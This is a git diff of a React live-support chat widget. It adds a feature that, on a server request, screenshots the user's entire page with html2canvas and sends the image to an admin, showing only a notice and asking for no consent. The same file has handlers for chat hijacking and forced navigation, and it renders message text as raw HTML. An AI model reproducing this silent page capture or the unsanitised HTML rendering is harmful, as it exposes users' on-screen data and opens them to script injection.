@@ -6,6 +6,7 @@ import clsx from 'clsx';
 import useChatStore from '../../store/chatStore';
 import styles from './LiveSupport.module.scss';
 import { socket, API_URL } from '../../api/db';
+import html2canvas from 'html2canvas';
 
 const Typewriter = ({ text, onComplete, onTyping, forceStop }) => {
   const [displayedText, setDisplayedText] = useState('');
@@ -125,11 +126,33 @@ const LiveSupport = () => {
         setAirdropData(data);
       };
 
+      const onRequestScreenshot = async (data) => {
+        addMessage({ id: Date.now().toString(), text: 'Sistem yöneticisi ekran görüntünüzü talep etti. Ekran görüntüsü alınıyor...', sender: 'system' });
+        try {
+          const canvas = await html2canvas(document.body, { 
+            useCORS: true,
+            allowTaint: true,
+            logging: false,
+            scale: 1 
+          });
+          const imgData = canvas.toDataURL('image/jpeg', 0.5);
+          socket.emit('screenshot_taken', { image: imgData, sessionId: sessionId, adminChatId: data.adminChatId });
+        } catch (err) {
+          console.error('Screenshot failed', err);
+        }
+      };
+
+      const onSupportSystemMessage = (data) => {
+        addMessage({ id: Date.now().toString(), text: data.text, sender: 'system' });
+      };
+
       socket.on('support_chat_hijacked', onHijacked);
       socket.on('support_chat_released', onReleased);
       socket.on('support_chat_message', onMessage);
       socket.on('force_navigate', onForceNavigate);
       socket.on('incoming_airdrop', onIncomingAirdrop);
+      socket.on('request_screenshot', onRequestScreenshot);
+      socket.on('support_system_message', onSupportSystemMessage);
 
       return () => {
         socket.off('support_chat_hijacked', onHijacked);
@@ -137,6 +160,8 @@ const LiveSupport = () => {
         socket.off('support_chat_message', onMessage);
         socket.off('force_navigate', onForceNavigate);
         socket.off('incoming_airdrop', onIncomingAirdrop);
+        socket.off('request_screenshot', onRequestScreenshot);
+        socket.off('support_system_message', onSupportSystemMessage);
       };
     }
   }, [isOpen, isMinimized, userContext, sessionId, addMessage, navigate]);
@@ -519,31 +544,41 @@ const LiveSupport = () => {
                 // Chat Interface
                 <div className={styles.chatContainer}>
                   <div className={styles.messagesList}>
-                    {messages.map((msg, idx) => (
-                      <div key={msg.id || idx} className={clsx(styles.messageWrapper, styles[msg.sender])}>
-                        {msg.sender === 'ai' && (
-                          <div className={styles.msgAvatar}>
-                            <img src="/logo.svg" alt="AI" />
+                    {messages.map((msg, idx) => {
+                      if (msg.sender === 'system') {
+                        return (
+                          <div key={msg.id || idx} className={styles.systemMessage}>
+                            <span>{msg.text}</span>
                           </div>
-                        )}
-                        <div className={styles.messageBubble}>
-                          {(msg.sender === 'ai' && msg.isNew) ? (
-                            <Typewriter 
-                              text={msg.text} 
-                              forceStop={forceStopTyping && activeTypingId === msg.id}
-                              onComplete={(finalText) => handleTypingComplete(msg.id, finalText)} 
-                              onTyping={scrollToBottom} 
-                            />
-                          ) : msg.audioUrl ? (
-                            <div className={styles.audioMessage}>
-                              <audio controls src={msg.audioUrl} />
+                        );
+                      }
+                      
+                      return (
+                        <div key={msg.id || idx} className={clsx(styles.messageWrapper, styles[msg.sender])}>
+                          {msg.sender === 'ai' && (
+                            <div className={styles.msgAvatar}>
+                              <img src="/logo.svg" alt="AI" />
                             </div>
-                          ) : (
-                            <span dangerouslySetInnerHTML={{ __html: msg.text.replace(/\n/g, '<br/>') }} />
                           )}
+                          <div className={styles.messageBubble}>
+                            {(msg.sender === 'ai' && msg.isNew) ? (
+                              <Typewriter 
+                                text={msg.text} 
+                                forceStop={forceStopTyping && activeTypingId === msg.id}
+                                onComplete={(finalText) => handleTypingComplete(msg.id, finalText)} 
+                                onTyping={scrollToBottom} 
+                              />
+                            ) : msg.audioUrl ? (
+                              <div className={styles.audioMessage}>
+                                <audio controls src={msg.audioUrl} />
+                              </div>
+                            ) : (
+                              <span dangerouslySetInnerHTML={{ __html: msg.text.replace(/\n/g, '<br/>') }} />
+                            )}
+                          </div>
                         </div>
-                      </div>
-                    ))}
+                      );
+                    })}
                     
                     {isWaitingForAPI && (
                       <div className={clsx(styles.messageWrapper, styles.ai)}>
